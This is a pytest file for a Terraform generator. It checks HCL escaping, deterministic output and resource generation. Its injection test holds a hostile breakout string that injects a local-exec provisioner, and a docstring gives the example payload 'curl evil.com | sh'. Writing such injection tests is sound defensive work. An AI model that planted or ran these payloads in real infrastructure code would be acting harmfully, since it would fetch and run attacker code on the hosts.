"""Tests for Terraform generation, HCL escaping, and injection safety."""

import shutil
import subprocess

import pytest

from app.models import Architecture, Node
from app.parser import parse_architecture
from app.terraform.generator import TerraformGenerator, hcl_string


def test_hcl_string_escaping() -> None:
    # Basic strings
    assert hcl_string("hello") == "hello"

    # Quotes and backslashes
    assert hcl_string(r'quote "test" \ slash') == r"quote \"test\" \\ slash"

    # HCL interpolation breakout attempts
    assert hcl_string("${var.secret_token}") == "$${var.secret_token}"
    assert hcl_string("%{if true}evil%{endif}") == "%%{if true}evil%%{endif}"

    # Newlines
    assert hcl_string("line1\nline2\r\n") == r"line1\nline2\r\n"


def test_hostile_terraform_breakout_injection(tmp_path) -> None:
    """Test hostile breakout payloads attempting to close blocks or inject provisioners.

    Example payload:
    "} provisioner "local-exec" { command = "curl evil.com | sh" }
    """
    hostile_desc = '"} provisioner "local-exec" {\n  command = "touch /tmp/pwned"\n}\nresource "null_resource" "pwn" {'
    arch = Architecture(
        name="injection_test",
        region="us-east-1",
        nodes=[
            Node(id="vpc_1", type="vpc", props={"cidr": "10.0.0.0/16"}),
            Node(
                id="sg_hostile",
                type="security_group",
                parent="vpc_1",
                props={
                    "description": hostile_desc,
                    "ingress": [
                        {
                            "port": 443,
                            "cidr": "10.0.0.0/16",
                            "protocol": "tcp",
                        }
                    ],
                },
            ),
        ],
    )
    generator = TerraformGenerator(arch)
    files = generator.generate()
    main_tf = files["main.tf"]

    # Verify escaping prevents breakout into actual block syntax
    assert 'provisioner "local-exec"' not in [
        line.strip() for line in main_tf.splitlines()
    ]
    # Verify the hostile string is safely enclosed inside quotes with escaped characters
    assert r"\"} provisioner \"local-exec\"" in main_tf
    assert r"\n" in main_tf


def test_deterministic_generator_output() -> None:
    raw_yaml = """
name: deterministic-test
region: us-east-1
resources:
  - id: vpc_b
    type: vpc
    props:
      cidr: 10.0.0.0/16
  - id: sub_b
    type: subnet
    in: vpc_b
    props:
      cidr: 10.0.1.0/24
      public: true
  - id: s3_b
    type: s3
    props:
      versioning: true
      public: false
"""
    arch = parse_architecture(raw_yaml)
    gen = TerraformGenerator(arch)

    run1 = gen.generate()
    run2 = gen.generate()
    assert run1 == run2
    assert "aws_vpc" in run1["main.tf"]
    assert "aws_internet_gateway" in run1["main.tf"]  # Synthesized for public subnet
    assert "aws_route_table" in run1["main.tf"]  # Synthesized


def test_generator_all_resource_types(tmp_path) -> None:
    arch = Architecture(
        name="full_stack",
        region="ap-south-1",
        nodes=[
            Node(id="vpc_1", type="vpc", props={"cidr": "10.0.0.0/16"}),
            Node(
                id="sub_1",
                type="subnet",
                parent="vpc_1",
                props={"cidr": "10.0.1.0/24", "public": False},
            ),
            Node(
                id="sg_1",
                type="security_group",
                parent="vpc_1",
                props={
                    "ingress": [{"port": 80, "protocol": "tcp"}],
                    "egress": [{"port": 0, "protocol": "-1"}],
                },
            ),
            Node(
                id="ec2_1",
                type="ec2",
                parent="sub_1",
                uses=["sg_1"],
                props={"instance_type": "t3.micro", "ebs_encrypted": True},
            ),
            Node(id="ebs_1", type="ebs", props={"size_gb": 30, "encrypted": True}),
            Node(
                id="rds_1",
                type="rds",
                parent="sub_1",
                props={"engine": "postgres", "storage_encrypted": True},
            ),
            Node(
                id="s3_1",
                type="s3",
                props={"versioning": True, "public": False, "encryption": True},
            ),
            Node(id="cw_1", type="cloudwatch", props={"retention_days": 14}),
            Node(id="sns_1", type="sns", props={"display_name": "Alerts"}),
            Node(
                id="iam_1",
                type="iam_role",
                props={"assume_role_service": "ec2.amazonaws.com"},
            ),
        ],
    )
    generator = TerraformGenerator(arch)
    files = generator.write_to_directory(tmp_path)
    assert len(files) == 4
    for fname in ["main.tf", "variables.tf", "outputs.tf", "providers.tf"]:
        assert (tmp_path / fname).exists()


def test_optional_terraform_validate(tmp_path) -> None:
    """Degrade gracefully if terraform binary is not installed."""
    arch = Architecture(
        name="tf_check",
        region="us-east-1",
        nodes=[Node(id="v1", type="vpc", props={"cidr": "10.0.0.0/16"})],
    )
    generator = TerraformGenerator(arch)
    generator.write_to_directory(tmp_path)

    tf_bin = shutil.which("terraform")
    if not tf_bin:
        pytest.skip(
            "Terraform CLI not installed on host; skipping terraform validate execution"
        )

    # If terraform is installed, run init and validate
    res_init = subprocess.run(
        [tf_bin, "init", "-backend=false"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    assert res_init.returncode == 0
    res_val = subprocess.run(
        [tf_bin, "validate"],
        cwd=tmp_path,
        capture_output=True,
        text=True,
        timeout=15,
        check=False,
    )
    assert res_val.returncode == 0
